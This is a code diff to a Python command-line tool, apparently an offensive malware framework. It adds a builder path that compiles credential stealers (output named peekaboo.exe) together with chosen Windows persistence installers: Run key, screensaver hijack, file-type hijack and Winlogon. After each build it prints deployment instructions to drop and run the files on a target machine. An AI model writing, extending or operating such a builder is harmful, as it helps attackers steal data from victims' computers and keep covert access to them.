@@ -4261,7 +4261,25 @@ def run_builder() -> None:
     slug_map: dict[str, dict] = {m["slug"]: m for m in all_mods}
     all_slugs = sorted(slug_map.keys())
 
-    completer = WordCompleter(BUILDER_COMMANDS + all_slugs, ignore_case=True)
+    # stealer + persistence discovery (malware/stealer/ and malware/persistence/)
+    _mal_dir      = Path(__file__).parent / "malware"
+    _stealer_dir  = _mal_dir / "stealer"
+    _pers_dir     = _mal_dir / "persistence"
+    stealer_names = sorted(f.stem for f in _stealer_dir.glob("*.c")) if _stealer_dir.exists() else []
+    pers_names    = sorted(f.stem for f in _pers_dir.glob("*.c"))    if _pers_dir.exists()  else []
+    stealer_set   = set(stealer_names)
+
+    _PERS_DESC = {
+        "registry_run":    "HKCU\\Run key  (user-level, no elevation needed)",
+        "screensaver":     "Screensaver hijack  (HKCU\\Control Panel\\Desktop)",
+        "filetype_hijack": "File type association hijack  (HKCU\\Classes)",
+        "winlogon":        "Winlogon Shell/Userinit  (requires SYSTEM privileges)",
+    }
+
+    completer = WordCompleter(
+        BUILDER_COMMANDS + all_slugs + stealer_names + pers_names,
+        ignore_case=True,
+    )
     session: PromptSession = PromptSession(
         history=InMemoryHistory(),
         completer=completer,
@@ -4275,6 +4293,7 @@ def run_builder() -> None:
     console.print(Panel(
         f"  {len(all_mods)} compilable modules  |  "
         f"{win_n} Windows  {lin_n} Linux\n"
+        f"  {len(stealer_names)} stealers  |  {len(pers_names)} persistence mechanisms\n"
         f"  type  help  for commands,  list  to browse,  back  to return",
         title="[heading] Builder [/heading]",
         border_style="cyan",
@@ -4318,7 +4337,22 @@ def run_builder() -> None:
         elif cmd == "list":
             if args:
                 f = args[0].lower()
-                if f in ("windows", "linux", "macos"):
+                if f == "stealer":
+                    t = Table(box=box.ASCII, show_header=True, header_style="heading",
+                              border_style="dim", padding=(0, 1),
+                              title=f"Stealers  ({len(stealer_names)})")
+                    t.add_column("#",       style="dim", min_width=3,  justify="right")
+                    t.add_column("name",    style="cmd", min_width=18)
+                    t.add_column("source",  style="dim", min_width=26)
+                    for i, n in enumerate(stealer_names, 1):
+                        t.add_row(str(i), n, f"malware/stealer/{n}.c")
+                    console.print()
+                    console.print(t)
+                    console.print(
+                        f"  [dim]use  build <name>  to compile with persistence choice[/dim]\n"
+                    )
+                    continue
+                elif f in ("windows", "linux", "macos"):
                     current_view = [m for m in all_mods if m["platform"] == f]
                     current_title = f"Compilable Modules: platform={f}"
                 else:
@@ -4364,9 +4398,128 @@ def run_builder() -> None:
         # -- build <slug> -----------------------------------------------------
         elif cmd == "build":
             if not args:
-                console.print("[warn][!] usage: build <slug>[/warn]")
+                console.print("[warn][!] usage: build <slug>  (or: build <stealer-name>)[/warn]")
                 continue
             slug = args[0]
+
+            # -- stealer build path -------------------------------------------
+            if slug in stealer_set:
+                console.print()
+                # persistence selection table
+                t = Table(box=box.ASCII, show_header=True, header_style="heading",
+                          border_style="dim", padding=(0, 1),
+                          title="Persistence Mechanisms")
+                t.add_column("#",    style="dim", min_width=3, justify="right")
+                t.add_column("name", style="cmd", min_width=18)
+                t.add_column("description", style="dim", min_width=46)
+                for i, pn in enumerate(pers_names, 1):
+                    t.add_row(str(i), pn, _PERS_DESC.get(pn, ""))
+                t.add_row(str(len(pers_names) + 1), "none", "skip persistence")
+                console.print(t)
+                console.print()
+
+                try:
+                    pers_raw = session.prompt(
+                        "  persistence [registry_run]: ", style=PT_STYLE
+                    ).strip().lower()
+                except (KeyboardInterrupt, EOFError):
+                    console.print("\n[dim]build cancelled[/dim]\n")
+                    continue
+                pers_choice = pers_raw if pers_raw in pers_names else (
+                    None if pers_raw == "none" else "registry_run"
+                )
+
+                session_id = _uuid.uuid4().hex[:12]
+                build_id   = f"cli-{_uuid.uuid4().hex[:8]}"
+                start_t    = _dt.now()
+
+                # compile stealer
+                console.print()
+                with console.status(
+                    f"[info]compiling stealer: {slug}...[/info]", spinner="dots"
+                ):
+                    s_ok, s_log, s_out = _compiler.compile_stealer(slug, session_id)
+                end_t = _dt.now()
+                _render_build_log(s_log, s_ok)
+
+                p_ok, p_log, p_out = True, "", None
+                if s_ok and pers_choice:
+                    with console.status(
+                        f"[info]compiling persistence: {pers_choice}...[/info]",
+                        spinner="dots"
+                    ):
+                        p_ok, p_log, p_out = _compiler.compile_persistence(
+                            pers_choice, s_out.parent
+                        )
+                    _render_build_log(p_log, p_ok)
+
+                elapsed = (_dt.now() - start_t).total_seconds()
+
+                if s_ok:
+                    s_size = s_out.stat().st_size if s_out and s_out.exists() else 0
+                    p_size = p_out.stat().st_size if p_out and p_out.exists() else 0
+                    body = (
+                        f"  peekaboo.exe   : {s_out}  ({s_size:,} bytes)\n"
+                        + (f"  persistence.exe: {p_out}  ({p_size:,} bytes)\n"
+                           if p_out else "")
+                        + f"  Time           : {elapsed:.2f}s"
+                    )
+                    console.print(Panel(body,
+                                        title="[ok] BUILD OK [/ok]",
+                                        border_style="ok", box=box.ASCII))
+                    console.print()
+
+                    # deployment instructions
+                    pers_note = pers_choice or "none"
+                    priv_note = ""
+                    if pers_choice == "winlogon":
+                        priv_note = "\n  [warn]note: winlogon requires SYSTEM/admin privileges[/warn]"
+                    instr = (
+                        f"  1. drop files to target machine:\n"
+                        f"       peekaboo.exe     - stealer ({slug})\n"
+                        + (f"       persistence.exe  - persistence installer ({pers_note})\n"
+                           if p_out else "")
+                        + f"  2. run stealer: peekaboo.exe\n"
+                        + (f"  3. run persistence: persistence.exe\n"
+                           f"       (optionally: persistence.exe C:\\Users\\Public\\peekaboo.exe)\n"
+                           if p_out else "")
+                        + priv_note
+                    )
+                    console.print(Panel(instr,
+                                        title="[heading] Deployment Instructions [/heading]",
+                                        border_style="dim", box=box.ASCII))
+                else:
+                    console.print(Panel(
+                        f"  Stealer  : {slug}\n"
+                        f"  Elapsed  : {elapsed:.2f}s\n"
+                        f"  [dim]Check log above for error details[/dim]",
+                        title="[err] BUILD FAILED [/err]",
+                        border_style="err", box=box.ASCII,
+                    ))
+
+                console.print()
+
+                try:
+                    _db.save_build({
+                        "id":         build_id,
+                        "params":     {
+                            "malware":     "stealer",
+                            "stealer":     slug,
+                            "persistence": pers_choice or "none",
+                        },
+                        "status":     "success" if s_ok else "failed",
+                        "output":     s_log + ("\n" + p_log if p_log else ""),
+                        "returncode": 0 if s_ok else 1,
+                        "created":    start_t.isoformat(),
+                        "start_time": start_t.isoformat(),
+                        "end_time":   end_t.isoformat(),
+                    })
+                    console.print(f"  [dim]build saved: {build_id}[/dim]\n")
+                except Exception as exc:
+                    console.print(f"  [warn][!] db save error: {exc}[/warn]\n")
+                continue
+
+            # -- meow module path ---------------------------------------------
             mod = slug_map.get(slug)
             if not mod:
                 matches = [s for s in slug_map if slug in s]
